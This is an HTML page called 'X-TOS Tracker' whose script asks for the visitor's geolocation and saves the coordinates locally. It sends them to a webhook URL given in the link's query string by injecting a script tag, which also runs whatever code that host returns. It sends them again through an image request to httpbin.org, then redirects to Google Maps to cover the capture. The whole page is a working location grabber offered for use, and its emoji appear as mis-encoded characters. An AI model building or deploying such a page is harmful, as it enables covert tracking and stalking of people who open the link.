<!DOCTYPE html>
<html>
<head>
    <title>X-TOS Tracker</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { font-family: Arial; text-align: center; padding: 20px; background: #000; color: #0f0; }
        .container { max-width: 400px; margin: 0 auto; }
        .status { padding: 20px; border: 1px solid #0f0; margin: 20px 0; }
        .loading { animation: blink 1s infinite; }
        @keyframes blink { 0%, 50% { opacity: 1; } 51%, 100% { opacity: 0.3; } }
    </style>
</head>
<body>
    <div class="container">
        <h2>üõ°Ô∏è X-TOS TRACKER</h2>
        <div id="status" class="status loading">üì° Acquiring location...</div>
        <div id="coords"></div>
    </div>

    <script>
        const urlParams = new URLSearchParams(window.location.search);
        const webhookUrl = urlParams.get('webhook') || '';
        
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(function(position) {
                const lat = position.coords.latitude;
                const lng = position.coords.longitude;
                const accuracy = position.coords.accuracy;
                
                document.getElementById('status').innerHTML = '‚úÖ Location captured';
                document.getElementById('coords').innerHTML = 
                    `üìç ${lat.toFixed(6)}, ${lng.toFixed(6)}<br>üìè Accuracy: ${accuracy}m`;
                
                // Save location to localStorage and try to send via webhook
                const locationData = {
                    latitude: lat,
                    longitude: lng,
                    accuracy: accuracy,
                    timestamp: Date.now()
                };
                
                // Save locally
                localStorage.setItem('xtos_location', JSON.stringify(locationData));
                
                // Try to send via webhook URL with JSONP-like approach
                if (webhookUrl) {
                    const script = document.createElement('script');
                    script.src = `${webhookUrl}?callback=xtos&lat=${lat}&lng=${lng}&acc=${accuracy}&t=${Date.now()}`;
                    document.head.appendChild(script);
                    
                    // Also try image pixel tracking
                    const img = new Image();
                    img.src = `https://httpbin.org/get?lat=${lat}&lng=${lng}&t=${Date.now()}`;
                }
                
                // Show success and redirect
                setTimeout(() => {
                    document.getElementById('status').innerHTML = 'üöÄ Redirecting to maps...';
                    setTimeout(() => {
                        window.location.href = `https://maps.google.com/?q=${lat},${lng}`;
                    }, 1000);
                }, 2000);
                
            }, function(error) {
                document.getElementById('status').innerHTML = '‚ùå Location access denied';
                document.getElementById('coords').innerHTML = 'Error: ' + error.message;
                
                setTimeout(() => {
                    window.location.href = 'https://maps.google.com/';
                }, 3000);
            });
        } else {
            document.getElementById('status').innerHTML = '‚ùå Geolocation not supported';
        }
    </script>
</body>
</html>
